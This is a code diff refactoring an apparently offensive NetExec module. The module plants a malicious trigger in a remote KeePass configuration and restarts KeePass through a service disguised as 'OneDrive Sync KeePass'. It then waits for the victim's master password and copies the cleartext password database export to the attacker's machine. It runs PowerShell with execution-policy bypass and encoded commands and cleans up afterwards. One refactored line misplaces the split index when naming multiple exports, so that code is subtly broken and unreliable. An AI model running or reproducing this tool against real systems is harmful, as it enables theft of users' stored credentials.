@@ -46,17 +46,17 @@ class NXCModule:
         self.poll_frequency_seconds = 5
         self.dummy_service_name = "OneDrive Sync KeePass"
 
-        with open(get_ps_script("keepass_trigger_module/RemoveKeePassTrigger.ps1"), "r") as remove_trigger_script_file:
+        with open(get_ps_script("keepass_trigger_module/RemoveKeePassTrigger.ps1")) as remove_trigger_script_file:
             self.remove_trigger_script_str = remove_trigger_script_file.read()
 
-        with open(get_ps_script("keepass_trigger_module/AddKeePassTrigger.ps1"), "r") as add_trigger_script_file:
+        with open(get_ps_script("keepass_trigger_module/AddKeePassTrigger.ps1")) as add_trigger_script_file:
             self.add_trigger_script_str = add_trigger_script_file.read()
 
-        with open(get_ps_script("keepass_trigger_module/RestartKeePass.ps1"), "r") as restart_keepass_script_file:
+        with open(get_ps_script("keepass_trigger_module/RestartKeePass.ps1")) as restart_keepass_script_file:
             self.restart_keepass_script_str = restart_keepass_script_file.read()
 
     def options(self, context, module_options):
-        """
+        r"""
         ACTION (mandatory)      Performs one of the following actions, specified by the user:
                                   ADD           insert a new malicious trigger into KEEPASS_CONFIG_PATH's specified file
                                   CHECK         check if a malicious trigger is currently set in KEEPASS_CONFIG_PATH's
@@ -86,7 +86,6 @@ class NXCModule:
         Not all variables used by the module are available as options (ex: trigger name, temp folder path, etc.),
         but they can still be easily edited in the module __init__ code if needed
         """
-
         if "ACTION" in module_options:
             if module_options["ACTION"] not in [
                 "ADD",
@@ -98,12 +97,12 @@ class NXCModule:
                 "ALL",
             ]:
                 context.log.fail("Unrecognized action, use --options to list available parameters")
-                exit(1)
+                sys.exit(1)
             else:
                 self.action = module_options["ACTION"]
         else:
             context.log.fail("Missing ACTION option, use --options to list available parameters")
-            exit(1)
+            sys.exit(1)
 
         if "KEEPASS_CONFIG_PATH" in module_options:
             self.keepass_config_path = module_options["KEEPASS_CONFIG_PATH"]
@@ -120,7 +119,7 @@ class NXCModule:
         if "PSH_EXEC_METHOD" in module_options:
             if module_options["PSH_EXEC_METHOD"] not in ["ENCODE", "PS1"]:
                 context.log.fail("Unrecognized powershell execution method, use --options to list available parameters")
-                exit(1)
+                sys.exit(1)
             else:
                 self.powershell_exec_method = module_options["PSH_EXEC_METHOD"]
 
@@ -141,7 +140,6 @@ class NXCModule:
 
     def add_trigger(self, context, connection):
         """Add a malicious trigger to a remote KeePass config file using the powershell script AddKeePassTrigger.ps1"""
-
         # check if the specified KeePass configuration file exists
         if self.trigger_added(context, connection):
             context.log.display(f"The specified configuration file {self.keepass_config_path} already contains a trigger called '{self.trigger_name}', skipping")
@@ -171,14 +169,13 @@ class NXCModule:
 
         # checks if the malicious trigger was effectively added to the specified KeePass configuration file
         if self.trigger_added(context, connection):
-            context.log.success(f"Malicious trigger successfully added, you can now wait for KeePass reload and poll the exported files")
+            context.log.success("Malicious trigger successfully added, you can now wait for KeePass reload and poll the exported files")
         else:
-            context.log.fail(f"Unknown error when adding malicious trigger to file")
+            context.log.fail("Unknown error when adding malicious trigger to file")
             sys.exit(1)
 
     def check_trigger_added(self, context, connection):
-        """check if the trigger is added to the config file XML tree"""
-
+        """Check if the trigger is added to the config file XML tree"""
         if self.trigger_added(context, connection):
             context.log.display(f"Malicious trigger '{self.trigger_name}' found in '{self.keepass_config_path}'")
         else:
@@ -186,20 +183,19 @@ class NXCModule:
 
     def restart(self, context, connection):
         """Force the restart of KeePass process using a Windows service defined using the powershell script RestartKeePass.ps1
-        If multiple process belonging to different users are running simultaneously,
-        relies on the USER option to choose which one to restart"""
 
+        If multiple process belonging to different users are running simultaneously, relies on the USER option to choose which one to restart
+        """
         # search for keepass processes
         search_keepass_process_command_str = 'powershell.exe "Get-Process keepass* -IncludeUserName | Select-Object -Property Id,UserName,ProcessName | ConvertTo-CSV -NoTypeInformation"'
         search_keepass_process_output_csv = connection.execute(search_keepass_process_command_str, True)
-        # we return the powershell command as a CSV for easier column parsing
-        csv_reader = reader(search_keepass_process_output_csv.split("\n"), delimiter=",")
-        next(csv_reader)  # to skip the header line
-        keepass_process_list = list(csv_reader)
+
+        # we return the powershell command as a CSV for easier column parsing, skipping the header line
+        csv_reader = reader(search_keepass_process_output_csv.split("\n")[1:], delimiter=",")
+
         # check if multiple processes belonging to different users are running (in order to choose which one to restart)
-        keepass_users = []
-        for process in keepass_process_list:
-            keepass_users.append(process[1])
+        keepass_users = [process[1] for process in list(csv_reader)]
+
         if len(keepass_users) == 0:
             context.log.fail("No running KeePass process found, aborting restart")
             return
@@ -223,7 +219,7 @@ class NXCModule:
             context.log.fail("Multiple KeePass processes were found, please specify parameter USER to target one")
             return
 
-        context.log.display("Restarting {}'s KeePass process".format(keepass_users[0]))
+        context.log.display(f"Restarting {keepass_users[0]}'s KeePass process")
 
         # prepare the restarting script based on user-specified parameters (e.g: keepass user, etc)
         # see data/keepass_trigger_module/RestartKeePass.ps1
@@ -234,27 +230,28 @@ class NXCModule:
         # actually performs the restart on the remote target
         if self.powershell_exec_method == "ENCODE":
             restart_keepass_script_b64 = b64encode(self.restart_keepass_script_str.encode("UTF-16LE")).decode("utf-8")
-            restart_keepass_script_cmd = "powershell.exe -e {}".format(restart_keepass_script_b64)
+            restart_keepass_script_cmd = f"powershell.exe -e {restart_keepass_script_b64}"
             connection.execute(restart_keepass_script_cmd)
         elif self.powershell_exec_method == "PS1":
             try:
                 self.put_file_execute_delete(context, connection, self.restart_keepass_script_str)
             except Exception as e:
-                context.log.fail("Error while restarting KeePass: {}".format(e))
+                context.log.fail(f"Error while restarting KeePass: {e}")
                 return
 
     def poll(self, context, connection):
         """Search for the cleartext database export file in the specified export folder
-        (until found, or manually exited by the user)"""
+        (until found, or manually exited by the user)
+        """
         found = False
         context.log.display(f"Polling for database export every {self.poll_frequency_seconds} seconds, please be patient")
         context.log.display("we need to wait for the target to enter his master password ! Press CTRL+C to abort and use clean option to cleanup everything")
         # if the specified path is %APPDATA%, we need to check in every user's folder
         if self.export_path == "%APPDATA%" or self.export_path == "%appdata%":
-            poll_export_command_str = "powershell.exe \"Get-LocalUser | Where {{ $_.Enabled -eq $True }} | select name | ForEach-Object {{ Write-Output ('C:\\Users\\'+$_.Name+'\\AppData\\Roaming\\{}')}} | ForEach-Object {{ if (Test-Path $_ -PathType leaf){{ Write-Output $_ }}}}\"".format(self.export_name)
+            poll_export_command_str = f"powershell.exe \"Get-LocalUser | Where {{ $_.Enabled -eq $True }} | select name | ForEach-Object {{ Write-Output ('C:\\Users\\'+$_.Name+'\\AppData\\Roaming\\{self.export_name}')}} | ForEach-Object {{ if (Test-Path $_ -PathType leaf){{ Write-Output $_ }}}}\""
         else:
             export_full_path = f"'{self.export_path}\\{self.export_name}'"
-            poll_export_command_str = 'powershell.exe "if (Test-Path {} -PathType leaf){{ Write-Output {} }}"'.format(export_full_path, export_full_path)
+            poll_export_command_str = f'powershell.exe "if (Test-Path {export_full_path} -PathType leaf){{ Write-Output {export_full_path} }}"'
 
         # we poll every X seconds until the export path is found on the remote machine
         while not found:
@@ -263,7 +260,7 @@ class NXCModule:
                 print(".", end="", flush=True)
                 sleep(self.poll_frequency_seconds)
                 continue
-            print("")
+            print()
 
             # once a database is found, downloads it to the attackers machine
             context.log.success("Found database export !")
@@ -274,29 +271,26 @@ class NXCModule:
                     connection.conn.getFile(self.share, export_path.split(":")[1], buffer.write)
 
                     # if multiple exports found, add a number at the end of local path to prevent override
-                    if count > 0:
-                        local_full_path = self.local_export_path + "/" + self.export_name.split(".")[0] + "_" + str(count) + "." + self.export_name.split(".")[1]
-                    else:
-                        local_full_path = self.local_export_path + "/" + self.export_name
+                    local_full_path = f"{self.local_export_path}/{self.export_name.split('.'[0])}_{count!s}.{self.export_name.split('.'[1])}" if count > 0 else f"{self.local_export_path}/{self.export_name}"
 
                     # downloads the exported database
                     with open(local_full_path, "wb") as f:
                         f.write(buffer.getbuffer())
-                    remove_export_command_str = "powershell.exe Remove-Item {}".format(export_path)
+                    remove_export_command_str = f"powershell.exe Remove-Item {export_path}"
                     connection.execute(remove_export_command_str, True)
-                    context.log.success('Moved remote "{}" to local "{}"'.format(export_path, local_full_path))
+                    context.log.success(f'Moved remote "{export_path}" to local "{local_full_path}"')
                     found = True
                 except Exception as e:
-                    context.log.fail("Error while polling export files, exiting : {}".format(e))
+                    context.log.fail(f"Error while polling export files, exiting : {e}")
 
     def clean(self, context, connection):
         """Checks for database export + malicious trigger on the remote host, removes everything"""
         # if the specified path is %APPDATA%, we need to check in every user's folder
         if self.export_path == "%APPDATA%" or self.export_path == "%appdata%":
-            poll_export_command_str = "powershell.exe \"Get-LocalUser | Where {{ $_.Enabled -eq $True }} | select name | ForEach-Object {{ Write-Output ('C:\\Users\\'+$_.Name+'\\AppData\\Roaming\\{}')}} | ForEach-Object {{ if (Test-Path $_ -PathType leaf){{ Write-Output $_ }}}}\"".format(self.export_name)
+            poll_export_command_str = f"powershell.exe \"Get-LocalUser | Where {{ $_.Enabled -eq $True }} | select name | ForEach-Object {{ Write-Output ('C:\\Users\\'+$_.Name+'\\AppData\\Roaming\\{self.export_name}')}} | ForEach-Object {{ if (Test-Path $_ -PathType leaf){{ Write-Output $_ }}}}\""
         else:
             export_full_path = f"'{self.export_path}\\{self.export_name}'"
-            poll_export_command_str = 'powershell.exe "if (Test-Path {} -PathType leaf){{ Write-Output {} }}"'.format(export_full_path, export_full_path)
+            poll_export_command_str = f'powershell.exe "if (Test-Path {export_full_path} -PathType leaf){{ Write-Output {export_full_path} }}"'
         poll_export_command_output = connection.execute(poll_export_command_str, True)
 
         # deletes every export found on the remote machine
@@ -352,7 +346,7 @@ class NXCModule:
         self.extract_password(context)
 
     def trigger_added(self, context, connection):
-        """check if the trigger is added to the config file XML tree (returns True/False)"""
+        """Check if the trigger is added to the config file XML tree (returns True/False)"""
         # check if the specified KeePass configuration file exists
         if not self.keepass_config_path:
             context.log.fail("No KeePass configuration file specified, exiting")
@@ -372,19 +366,15 @@ class NXCModule:
             sys.exit(1)
 
         # check if the specified KeePass configuration file does not already contain the malicious trigger
-        for trigger in keepass_config_xml_root.findall(".//Application/TriggerSystem/Triggers/Trigger"):
-            if trigger.find("Name").text == self.trigger_name:
-                return True
-
-        return False
+        return any(trigger.find("Name").text == self.trigger_name for trigger in keepass_config_xml_root.findall(".//Application/TriggerSystem/Triggers/Trigger"))
 
     def put_file_execute_delete(self, context, connection, psh_script_str):
         """Helper to upload script to a temporary folder, run then deletes it"""
         script_str_io = StringIO(psh_script_str)
         connection.conn.putFile(self.share, self.remote_temp_script_path.split(":")[1], script_str_io.read)
-        script_execute_cmd = "powershell.exe -ep Bypass -F {}".format(self.remote_temp_script_path)
+        script_execute_cmd = f"powershell.exe -ep Bypass -F {self.remote_temp_script_path}"
         connection.execute(script_execute_cmd, True)
-        remove_remote_temp_script_cmd = 'powershell.exe "Remove-Item "{}""'.format(self.remote_temp_script_path)
+        remove_remote_temp_script_cmd = f'powershell.exe "Remove-Item "{self.remote_temp_script_path}""'
         connection.execute(remove_remote_temp_script_cmd)
 
     def extract_password(self, context):
